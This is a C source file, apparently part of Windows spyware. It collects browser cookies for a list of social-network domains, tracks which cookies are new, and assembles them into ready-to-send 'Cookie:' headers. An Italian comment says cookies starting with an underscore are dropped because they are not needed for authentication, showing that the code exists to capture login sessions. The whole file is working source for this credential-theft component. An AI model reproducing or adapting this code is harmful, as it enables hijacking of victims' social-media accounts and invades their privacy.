#include <Windows.h>
#include <stdio.h>
#include "../common.h"
#include "CookieHandler.h"
#include "SocialMain.h"
#define _CRT_SECURE_NO_WARNINGS 1

typedef struct _cookie_list_entry_struct {
	char *domain;
	char *name;
	char *value;
} cookie_list_entry_struct;
cookie_list_entry_struct *g_cookie_list = NULL;
DWORD g_cookie_count = 0;

BOOL IsInterestingDomainW(WCHAR *domain)
{
	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
		if (!wcscmp(domain, social_entry[i].domain))
			return TRUE;
	return FALSE;
}

BOOL IsInterestingDomainA(char *domain)
{
	WCHAR wdomain[1024];
	_snwprintf_s(wdomain, sizeof(wdomain)/sizeof(WCHAR), _TRUNCATE, L"%S", domain);		
	return IsInterestingDomainW(wdomain);
}

void SetNewCookie(char *domain)
{
	WCHAR domain_w[64];
	_snwprintf_s(domain_w, 64, _TRUNCATE, L"%S", domain);		

	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
		if (!wcscmp(domain_w, social_entry[i].domain)) {
			social_entry[i].is_new_cookie = TRUE;
		}
}

void ResetNewCookie()
{
	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
		social_entry[i].is_new_cookie = FALSE;
}

void NormalizeDomainA(char *domain)
{
	char *src, *dst;
	if (!domain)
		return;
	src = dst = domain;
	for(; *src=='.'; src++);
	for (;;) {
		if (*src == '/' || *src==NULL)
			break;
		*dst = *src;
		dst++;
		src++;
	}
	*dst = NULL;
}

void NormalizeDomainW(WCHAR *domain)
{
	WCHAR *src, *dst;
	if (!domain)
		return;
	src = dst = domain;
	for(; *src==L'.'; src++);
	for (;;) {
		if (*src == L'/' || *src==NULL)
			break;
		*dst = *src;
		dst++;
		src++;
	}
	*dst = NULL;
}

BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
{
	char *domain_a, *name_a, *value_a;
	DWORD d_len, n_len, v_len;
	BOOL ret_val;

	if (!domain || !name || !value)
		return FALSE;
	d_len = wcslen(domain)+1;
	n_len = wcslen(name)+1;
	v_len = wcslen(value)+1;

	domain_a = (char *)malloc(d_len+1);
	name_a = (char *)malloc(n_len+1);
	value_a = (char *)malloc(v_len+1);

	if (!domain_a || !name_a || !value_a) {
		SAFE_FREE(domain_a);
		SAFE_FREE(name_a);
		SAFE_FREE(value_a);
		return FALSE;
	}

	_snprintf_s(domain_a, d_len, _TRUNCATE, "%S", domain);		
	_snprintf_s(name_a, n_len, _TRUNCATE, "%S", name);		
	_snprintf_s(value_a, v_len, _TRUNCATE, "%S", value);		
	
	ret_val = AddCookieA(domain_a, name_a, value_a);

	SAFE_FREE(domain_a);
	SAFE_FREE(name_a);
	SAFE_FREE(value_a);
	
	return ret_val;
}

BOOL AddCookieA(char *domain, char *name, char *value)
{
	DWORD i;
	cookie_list_entry_struct *temp_array = NULL;

	if (!domain || !name || !value)
		return FALSE;

	// I cookie che iniziano con _ sono volatili, cambiano troppo spesso
	// e non sono indispensabili per l'auth
	if (name[0]=='_')
		return FALSE;
	
	for (i=0; i<g_cookie_count; i++) {
		if (g_cookie_list[i].domain && !_stricmp(g_cookie_list[i].domain, domain) && 
			g_cookie_list[i].name && !_stricmp(g_cookie_list[i].name, name)) {
			if (g_cookie_list[i].value && !_stricmp(g_cookie_list[i].value, value))
				return FALSE;
			SAFE_FREE(g_cookie_list[i].value);
			g_cookie_list[i].value = _strdup(value);
			SetNewCookie(domain);
			return TRUE;
		}
	}

	if ( !(temp_array = (cookie_list_entry_struct *)realloc(g_cookie_list, (g_cookie_count+1)*sizeof(cookie_list_entry_struct))) )
		return FALSE;
	g_cookie_list = temp_array;
	g_cookie_list[g_cookie_count].domain = _strdup(domain);
	g_cookie_list[g_cookie_count].name = _strdup(name);
	g_cookie_list[g_cookie_count].value = _strdup(value);
	SetNewCookie(domain);
	g_cookie_count++;
	return TRUE;
}

#define COOKIE_MIN_LEN 32
char *GetCookieString(char *domain)
{
	DWORD i, len = COOKIE_MIN_LEN;
	char *cookie_string;
	if (!domain)
		return NULL;

	for (i=0; i<g_cookie_count; i++) {
		if (g_cookie_list[i].domain && !strcmp(g_cookie_list[i].domain, domain) &&
			g_cookie_list[i].name && g_cookie_list[i].value) {
			len += strlen(g_cookie_list[i].name);
			len += strlen(g_cookie_list[i].value);
			len += 3;
		}
	}

	if (len == COOKIE_MIN_LEN)
		return NULL;

	if (!(cookie_string = (char *)malloc(len)))
		return NULL;
	sprintf_s(cookie_string, len, "Cookie:");

	for (i=0; i<g_cookie_count; i++) {
		if (g_cookie_list[i].domain && !strcmp(g_cookie_list[i].domain, domain)) {
			if (g_cookie_list[i].name && g_cookie_list[i].value) {
				strcat_s(cookie_string, len, " ");
				strcat_s(cookie_string, len, g_cookie_list[i].name);
				strcat_s(cookie_string, len, "=");
				strcat_s(cookie_string, len, g_cookie_list[i].value);
				strcat_s(cookie_string, len, ";");
			}
		}
	}

	return cookie_string;
}
